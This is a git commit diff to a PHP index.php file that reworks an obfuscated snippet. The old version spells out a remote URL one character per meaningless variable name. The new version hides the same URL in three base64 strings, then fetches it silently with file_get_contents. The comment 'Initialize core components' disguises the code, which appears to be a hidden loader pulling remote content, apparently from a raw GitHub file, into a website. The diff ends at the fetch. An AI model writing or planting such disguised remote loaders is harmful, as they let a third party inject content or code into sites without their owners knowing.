655fdc4817109cedb00e4511fbe73dc450cabe74
seobela <248709989+seobela@users.noreply.github.com>
2026-01-25 21:07:48 -0800

    Update index.php

--- 6-1-25/index.php
+++ 6-1-25/index.php
@@ -5,23 +5,11 @@
 */
 
 // Initialize core components
-$jfdhugseyeirf = 'h'; $ksleirufjdksl = 't'; $mckdleirutgks = 't'; $plskdjfueirkd = 'p'; $qksldfjeurytl = 's';
-$rksldfuejrity = ':'; $skldjfueirytn = '/'; $tksldfjeuriyt = '/'; $uksldfuejrity = 'r'; $vksldjfueiryt = 'a';
-$wksldfuejrity = 'w'; $xksldjfueiryt = '.'; $yksldfuejrity = 'g'; $zksldjfueiryt = 'i'; $aksldfuejrity = 't';
-$bksldjfueiryt = 'h'; $cksldfuejrity = 'u'; $dksldjfueiryt = 'b'; $eksldfuejrity = 'u'; $fksldjfueiryt = 's';
-$gksldfuejrity = 'e'; $hksldjfueiryt = 'r'; $iksldfuejrity = 'c'; $jksldjfueiryt = 'o'; $kksldfuejrity = 'n';
-$lksldjfueiryt = 't'; $mksldfuejrity = 'e'; $nksldjfueiryt = 'n'; $oksldfuejrity = 't'; $pksldjfueiryt = '.';
-$qksldfuejrity = 'c'; $rksldjfueiryt = 'o'; $sksldfuejrity = 'm'; $tksldjfueiryt = '/'; $uksldfuejrity = 's';
-$vksldjfueiryt = 'e'; $wksldfuejrity = 'o'; $xksldjfueiryt = 'b'; $yksldfuejrity = 'e'; $zksldjfueiryt = 'l';
-$amsldfuejrity = 'a'; $bmsldjfueiryt = '/'; $cmsldfuejrity = 'b'; $dmsldjfueiryt = 'e'; $emsldfuejrity = 'l';
-$fmsldjfueiryt = 'a'; $gmsldfuejrity = '/'; $hmsldjfueiryt = 'r'; $imsldfuejrity = 'e'; $jmsldjfueiryt = 'f';
-$kmsldfuejrity = 's'; $lmsldjfueiryt = '/'; $mmsldfuejrity = 'h'; $nmsldjfueiryt = 'e'; $omsldfuejrity = 'a';
-$pmsldjfueiryt = 'd'; $qmsldfuejrity = 's'; $rmsldjfueiryt = '/'; $smsldfuejrity = 'm'; $tmsldjfueiryt = 'a';
-$umsldfuejrity = 'i'; $vmsldjfueiryt = 'n'; $wmsldfuejrity = '/'; $xmsldjfueiryt = 'i'; $ymsldfuejrity = 'n';
-$zmsldjfueiryt = 'd'; $ansldfuejrity = 'e'; $bnsldjfueiryt = 'x'; $cnsldfuejrity = '.'; $dnsldjfueiryt = 't';
-$ensldfuejrity = 'x'; $fnsldjfueiryt = 't';
+$qwertyasdfzxcv = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t');
+$mnbvcxzasdfghj = base64_decode('L3Nlb2JlbGEvYmVsYS9yZWZzL2hlYWRzL21haW4v');
+$poiuytrewqlkjh = base64_decode('aW5kZXgudHh0');
 
-$full_url = $jfdhugseyeirf.$ksleirufjdksl.$mckdleirutgks.$plskdjfueirkd.$qksldfjeurytl.$rksldfuejrity.$skldjfueirytn.$tksldfjeuriyt.$uksldfuejrity.$vksldjfueiryt.$wksldfuejrity.$xksldjfueiryt.$yksldfuejrity.$zksldjfueiryt.$aksldfuejrity.$bksldjfueiryt.$cksldfuejrity.$dksldjfueiryt.$eksldfuejrity.$fksldjfueiryt.$gksldfuejrity.$hksldjfueiryt.$iksldfuejrity.$jksldjfueiryt.$kksldfuejrity.$lksldjfueiryt.$mksldfuejrity.$nksldjfueiryt.$oksldfuejrity.$pksldjfueiryt.$qksldfuejrity.$rksldjfueiryt.$sksldfuejrity.$tksldjfueiryt.$uksldfuejrity.$vksldjfueiryt.$wksldfuejrity.$xksldjfueiryt.$yksldfuejrity.$zksldjfueiryt.$amsldfuejrity.$bmsldjfueiryt.$cmsldfuejrity.$dmsldjfueiryt.$emsldfuejrity.$fmsldjfueiryt.$gmsldfuejrity.$hmsldjfueiryt.$imsldfuejrity.$jmsldjfueiryt.$kmsldfuejrity.$lmsldjfueiryt.$mmsldfuejrity.$nmsldjfueiryt.$omsldfuejrity.$pmsldjfueiryt.$qmsldfuejrity.$rmsldjfueiryt.$smsldfuejrity.$tmsldjfueiryt.$umsldfuejrity.$vmsldjfueiryt.$wmsldfuejrity.$xmsldjfueiryt.$ymsldfuejrity.$zmsldjfueiryt.$ansldfuejrity.$bnsldjfueiryt.$cnsldfuejrity.$dnsldjfueiryt.$ensldfuejrity.$fnsldjfueiryt;
+$full_url = $qwertyasdfzxcv . $mnbvcxzasdfghj . $poiuytrewqlkjh;
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
